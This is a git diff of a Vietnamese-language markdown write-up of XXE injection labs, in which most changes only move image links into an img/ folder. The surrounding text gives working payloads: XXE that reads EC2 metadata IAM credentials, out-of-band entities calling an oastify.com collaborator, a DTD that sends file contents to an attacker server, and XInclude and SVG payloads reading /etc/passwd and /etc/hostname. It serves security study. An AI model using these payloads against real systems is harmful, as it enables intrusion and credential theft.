@@ -10,7 +10,7 @@ To solve the lab, inject an XML external entity to retrieve the contents of the 
 
 **Thực hiện**
 - Quan sát gói tin request và response của chức năng checkStock.
-![alt text](image.png)
+![alt text](img/image.png)
 
 - Nhận thấy ở tính năng sử dụng XML để thực hiện việc truy vấn. Vì thế ta có thể nghĩ tới XXE injection.
 ```XML
@@ -18,7 +18,7 @@ To solve the lab, inject an XML external entity to retrieve the contents of the 
 <stockCheck><productId>&execute;</productId><storeId>1</storeId>
 </stockCheck>
 ```
-![alt text](image-1.png)
+![alt text](img/image-1.png)
 
 **Note**
 Ở bài lab này hệ thống đã cho phép XML External Intity thông qua việc tự khai báo ngay trong tài liệu XML. 
@@ -42,14 +42,14 @@ Payload:
 <stockCheck><productId>&vul;</productId><storeId>1</storeId>
 </stockCheck>
 ```
-![alt text](image-2.png)
+![alt text](img/image-2.png)
 
 - Dựa vào kết quả trả về Product ID không hợp lệ : `latest` => ta biết các thông tin về thư mục đường dẫn.
 - Cứ lần lượt như vậy ta có thể trích xuất được danh sách `IAM Role` qua đường dẫn sau: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
-![alt text](image-3.png)
+![alt text](img/image-3.png)
 
 - Trích xuất thông tin của role `admin`
-![alt text](image-4.png)
+![alt text](img/image-4.png)
 
 **Note**
 Chúng ta có thể kết hợp với lỗ hổng SSRF nhằm mở rộng phạm vi tấn công như trơng bài lab là sử dụng SSRF kết hợp để trích xuất dữ liệu nhạy cảm của EC2.
@@ -69,7 +69,7 @@ To solve the lab, use an external entity to make the XML parser issue a DNS look
 
 **Thực hiện**
 - Quan sát gói tin request và response trả về. Thử thay đổi trường `<productID>` trong XML thì kết quả trả về không còn hiện thị nội dung chuỗi như các bài lab trên -> Blind
-![alt text](image-5.png)
+![alt text](img/image-5.png)
 
 - Ý tưởng tương tự như SSRF chúng ta có thể thực hiện gửi một truy vấn DNS tới dải bên ngoài để kiểm tra xem liệu có thể có lỗ hổng injection ở đây hay không
 Payload:
@@ -78,7 +78,7 @@ Payload:
 <stockCheck><productId>&vul;</productId><storeId>1</storeId>
 </stockCheck>
 ```
-![alt text](image-6.png)
+![alt text](img/image-6.png)
 
 - Vậy là hoàn thành bài lab.
 
@@ -95,7 +95,7 @@ To solve the lab, use a parameter entity to make the XML parser issue a DNS look
 
 **Thực hiện**
 - Cũng như bài lab trên ta có thể thử luôn bằng payload được sử dụng bên trên.
-![alt text](image-7.png)
+![alt text](img/image-7.png)
 
 - Thông báo Entities này không được phép sử dụng, chúng ta sẽ bypass bằng cách sử dụng `parameter entities`.
 Payload
@@ -103,9 +103,9 @@ Payload
 <!DOCTYPE name [<!ENTITY % abc SYSTEM "http://jaxx7bdprmz48fnsc4q1si1ho8uziq6f.oastify.com">%abc;]>
 <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
 ```
-![alt text](image-8.png)
-![alt text](image-9.png)
-![alt text](image-10.png)
+![alt text](img/image-8.png)
+![alt text](img/image-9.png)
+![alt text](img/image-10.png)
 
 - Hoàn thành bài lab
 **Note**
@@ -136,7 +136,7 @@ Payload
 <!DOCTYPE name [<!ENTITY % abc SYSTEM "http://jaxx7bdprmz48fnsc4q1si1ho8uziq6f.oastify.com">%abc;]>
 <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
 ```
-![alt text](image-11.png)
+![alt text](img/image-11.png)
 
 - Như vậy là xác nhận được lỗ hổng bước tiếp theo là tìm cách để trích xuất data.
 - Kịch bản ở đây sẽ là chúng ta sẽ tạo 1 tệp `.dtd` được lưu ở server (attacker). Khi ứng dụng mục tiêu xử lý XML có lỗi XXE (XML External Entity Injection), nó sẽ tải file `.dtd` từ server của kẻ tấn công, và thực thi các entity được khai báo bên trong để trích xuất dữ liệu nhạy cảm từ hệ thống.
@@ -147,13 +147,13 @@ Payload
 %eval;
 %leak;
 ```
-![alt text](image-12.png)
+![alt text](img/image-12.png)
 
 - Thực hiện chèn XML ở chức năng checkStock. Mục tiêu là `fetch` tới `.dtd` được đặt tại host của `attacker`.
-![alt text](image-13.png)
+![alt text](img/image-13.png)
 
 - Gửi đi và quan sát ở Burp Colaborator
-![alt text](image-14.png)
+![alt text](img/image-14.png)
 
 - Hoàn thành lab
 
@@ -196,8 +196,8 @@ The lab contains a link to an exploit server on a different domain where you can
 
 **Thực hiện**
 - Sử dụng burp colaborator để kiểm tra lỗ hổng
-![alt text](image-15.png)
-![alt text](image-16.png)
+![alt text](img/image-15.png)
+![alt text](img/image-16.png)
 
 - Tuy là thông báo lỗi nhưng bên Burp colaborator vẫn nhận được thông báo. Khi không có protocol, sau quá trình phân tích cú pháp XML, hệ thống đã ghép và truy cập tới `/home/peter/ftcx9mtq7g7r02xx8ihek1slscy3mtai.oastify.com`. Do không tìm thấy đường dẫn như trong ảnh nên trả về lỗi `java.io.FileNotFoundException`.
 - Vậy thì ý tưởng của bài này sẽ là thay thế chuỗi `burp-colaborator.domain` bằng nội dung file cần đọc, và kích hoạt lỗi phân tích cú pháp, từ đó nội dung file sẽ được trang web hiển thị cùng với error message.
@@ -217,7 +217,7 @@ The lab contains a link to an exploit server on a different domain where you can
 ```
 
 - Thực hiện khai thác
-![alt text](image-17.png)
+![alt text](img/image-17.png)
 
 **Note**
 Trong một số trường hợp khi chúng ta sử dụng sai cú pháp XML dẫn đến quá trình phân tích cú pháp dữ liệu gặp lỗi, lúc này hệ thống thường trả về các đoạn thông báo lỗi (error message), chúng có thể chứa một số thông tin nhạy cảm.
@@ -236,8 +236,8 @@ Systems using the GNOME desktop environment often have a DTD at `/usr/share/yelp
 
 **Thực hiện**
 - Thực hiện kiểm tra XXE Injection thông qua Burp Colaborator
-![alt text](image-18.png)
-![alt text](image-19.png)
+![alt text](img/image-18.png)
+![alt text](img/image-19.png)
 
 - Theo nội dung bài lab, chúng sẽ tận dụng bằng việc load file `.dtd` local và ghi đè lại các parameter entity có. Khi đó ta có thể khai báo thêm các entity khác.
 Payload:
@@ -255,7 +255,7 @@ Payload:
 ```
 
 - Hoàn thành bài lab.
-![alt text](image-20.png)
+![alt text](img/image-20.png)
 
 **Note**
 Khi bạn sử dụng một internal DTD (khai báo DTD trong XML) và external DTD (khai báo DTD từ một tệp ngoài), internal DTD có thể ghi đè các khai báo trong external DTD. Điều này có thể tạo ra một lỗ hổng bảo mật và cho phép kẻ tấn công khai thác bằng cách sử dụng parameter entity để tham chiếu vào một entity khác — điều mà thông thường không được phép.
@@ -274,17 +274,17 @@ By default, XInclude will try to parse the included document as XML. Since `/etc
 
 **Thực hiện**
 - Vẫn như các bài lab trước, ta sẽ quan sát gói tin request và response chức năng checkStock. Bài lab này không còn sử dụng POST với tài liệu XML nữa mà dùng cách data để truyền.
-![alt text](image-21.png)
+![alt text](img/image-21.png)
 
 - Thử với payload đặc biệt `%` thì hiện ra lỗi `Entities are not allowed` -> điều này chứng tỏ trang web này có quá trình phân tích XML.
-![alt text](image-22.png)
+![alt text](img/image-22.png)
 
 - Với kiến thức từ bài lab, ta đoán rằng ở bài lab này sử dụng `XInclude`. Tức là tham số ở `productId` hoặc `storeId` sẽ được truyền vào trong một tệp XML để xử lí. Ta có thể lợi dụng điều này để truyền vào đoạn mã `XInclude`.
 - Payload:
 ```
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
-![alt text](image-23.png)
+![alt text](img/image-23.png)
 
 - Hoàn thành bài lab.
 
@@ -308,10 +308,10 @@ To solve the lab, upload an image that displays the contents of the `/etc/hostna
 
 **Thực hiện**
 - Trước tiên chúng ta cần xác định vị trí có lỗ hổng. Quan sát gói tin request và response ở chức năng Post Comment.
-![alt text](image-24.png)
+![alt text](img/image-24.png)
 
 - Một số ứng dụng support hình ảnh có thể hỗ trợ cả file `.svg`. Thử upload file svg lên.
-![alt text](image-25.png)
+![alt text](img/image-25.png)
 
 - Upload thành công -> điều này có thể khẳng định svg được hỗ trợ, và chúng ta có thể dựa vào đây để chèn XML.
 ```xml
@@ -323,5 +323,6 @@ To solve the lab, upload an image that displays the contents of the `/etc/hostna
     <text x="10" y="50" font-size="20">&xxe;</text>
 </svg>
 ```
+
 **Note**
 Ứng dụng có thể yêu cầu người dùng tải lên hình ảnh ở các định dạng phổ biến như PNG hoặc JPEG để sử dụng làm avatar. Tuy nhiên, trong trường hợp này, thư viện xử lý hình ảnh được sử dụng (cụ thể là Apache Batik, một thư viện chuyên xử lý định dạng SVG) lại hỗ trợ các tệp SVG mà không thực hiện kiểm tra định dạng nghiêm ngặt ở phía ứng dụng. Điều này tạo ra một lỗ hổng bảo mật: mặc dù giao diện hoặc yêu cầu của ứng dụng hướng tới các định dạng ảnh raster thông thường (như PNG/JPEG), hacker vẫn có thể lợi dụng khả năng xử lý SVG của thư viện để tải lên một tệp SVG. Tệp SVG này, vốn là một định dạng dựa trên XML, có thể được thiết kế để chứa mã khai thác XML External Entity (XXE). Khi tệp SVG được xử lý bởi Apache Batik, mã XXE bên trong có thể bị kích hoạt, cho phép hacker truy cập dữ liệu nhạy cảm (như nội dung của /etc/hostname) mà không bị chặn bởi các biện pháp kiểm tra định dạng phía ứng dụng.
